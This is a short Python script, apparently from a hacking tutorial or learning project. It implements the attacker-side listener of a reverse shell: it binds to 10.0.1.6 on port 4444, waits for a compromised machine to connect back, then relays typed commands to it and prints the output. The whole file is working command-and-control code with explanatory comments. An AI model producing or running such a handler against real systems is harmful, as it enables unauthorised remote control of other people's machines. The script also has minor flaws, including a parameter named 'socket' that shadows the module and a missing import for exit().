#!/usr/bin/env python
import socket


def main():
    listener = Listener('10.0.1.6', 4444)
    listener.start()

class Listener: 
    def __init__(self, IP, socket):
        self.IP = IP
        self.socket = socket

    def start(self):
        try:
            # Open connection and once recieved store that connection and the device
            # connecting's address.
            connection, address = self.open_and_listen()
            print(f'[+] Connection received from {address}.')
            # After a connection is established, run a mock shell
            while True:
                result = self.send_commands(connection)
                print(result)
        except KeyboardInterrupt:
            # If keyboard interrupt (Ctrl+C) is detected, close the listener and exit
            self.listener.close()
            print('\n[+] Listener closed. Exiting...')
            exit()

    def send_commands(self, connection):
        command = input('>> ')
        # Commands are encoded to bytes before being sent
        connection.send(command.encode())
        # Responses are received as bytes and then decoded to strings
        # NOTE: This will not work with videos, pictures, or other binary data.
        return connection.recv(1024).decode()

    def open_and_listen(self):
        # Create a socket
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Allow reuse of a socket in TIME_WAIT state, without waiting for its natural timeout to expire
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # Bind the socket to the specified IP and port
        self.listener.bind((self.IP, self.socket))
        # Start listening for connections
        self.listener.listen(0)
        print('[+] Waiting for incoming connections...')
        # Accept a connection
        connection, address = self.listener.accept()
        # Return the connection and the address of the client
        return connection, address

if __name__ == '__main__':
    main()
